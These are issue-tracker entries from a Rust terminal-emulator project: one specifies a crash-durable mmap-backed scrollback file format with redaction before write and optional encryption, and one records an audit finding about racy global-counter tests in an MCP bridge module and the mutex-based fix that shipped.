- Heavy proof lanes are remote-required through RCH; local Cargo is not the default evidence path.
- Privacy and redaction failures are treated as correctness failures, not documentation gaps.

title: [BR-TERM-EMULATOR-UPLIFT-2.5.1] mmap-backed scrollback file format + write path
description:
Sub-bead of ft-2okh0.5. Implement the mmap-backed scrollback substrate that survives kill -9.

## Scope
1. File layout: ~/.local/share/ft/scrollback/<pane_id>.bin (page-aligned, 0600 mode).
2. File format: header (magic + version + pane_uuid + capacity + write_cursor) + ring buffer of cell records.
3. msync after every flush boundary so the OS commits to disk before the file descriptor is closed (kill -9 path).
4. Per-pane size cap (configurable; default 50MB).
5. Existing redactor (ft-x0666.G10) applies before write — secrets never reach mmap.
6. Optional encryption-at-rest: AES-256-GCM with per-user key under ~/.local/share/ft/scrollback.key (mode 0400). Feature-gated since key management adds operational complexity.

## Acceptance
- mmap-backed write path lands in the ingest pipeline (same site that currently writes to in-memory ring).
- Per-pane scrollback file exists, mode 0600.
- Redactor applied before write (verified by a known-secret-pattern test).
- Configurable size cap honored.
- Existing in-memory ring remains as the read-side fast path (mmap is durability, not access).

Cross-references:
- ft-2okh0.5 (parent epic)
- ft-x0666.G10 (redactor coverage matrix)
- crates/frankenterm-core/src/ingest.rs (current write site)

title: MCP bridge degraded counter tests race through global reset
description:
Reality-check audit finding in crates/frankenterm-core/src/mcp_bridge.rs.

Evidence:
- The degraded-startup telemetry is a process-global AtomicU64 at crates/frankenterm-core/src/mcp_bridge.rs:126-134.
- The test-only reset helper sets that global counter back to 0 at crates/frankenterm-core/src/mcp_bridge.rs:136-142.
- Multiple tests reset the counter and then assert exact before/after deltas at crates/frankenterm-core/src/mcp_bridge.rs:534-580.
- Other tests in the same module build degraded servers without any serialization at crates/frankenterm-core/src/mcp_bridge.rs:665-776 and 821-840, and build_server(config) also routes through the degraded path at crates/frankenterm-core/src/mcp_bridge.rs:566-580.

Why it matters:
Rust tests run in parallel by default. A sibling test can call build_server_degraded or build_server while a counter-delta test has reset the global and not yet sampled after, making exact counter assertions nondeterministic. That creates a flaky MCP bridge test surface around the same telemetry intended to make degraded startup observable.

Proposed remediation:
Serialize the counter-mutating tests with a module-local Mutex/serial_test guard, or move counter accounting behind an injectable test-local counter. Prefer delta tests that hold a lock across reset/build/read, and avoid exact global-count assertions in tests that can run concurrently with other degraded server construction.
notes: Shipped at e85c63193. Module-local mcp_bridge_counter_test_lock (poison-tolerant MutexGuard) acquired in all 9 tests that touch the counter or build a server through any path that bumps it (3 counter-delta + 5 manifest + 1 new concurrent-build property test). New test concurrent_degraded_builds_each_observe_exact_delta_ft_kske1 spawns 4 worker threads each holding the lock and asserts they all observe the exact skipped-entries constant — pre-fix would race, post-fix serialized. Build via scripts/cargo-local.sh check -p frankenterm-core --lib --no-default-features clean. Test compile is blocked by unrelated sibling-WIP in recording.rs but my changes are self-contained.
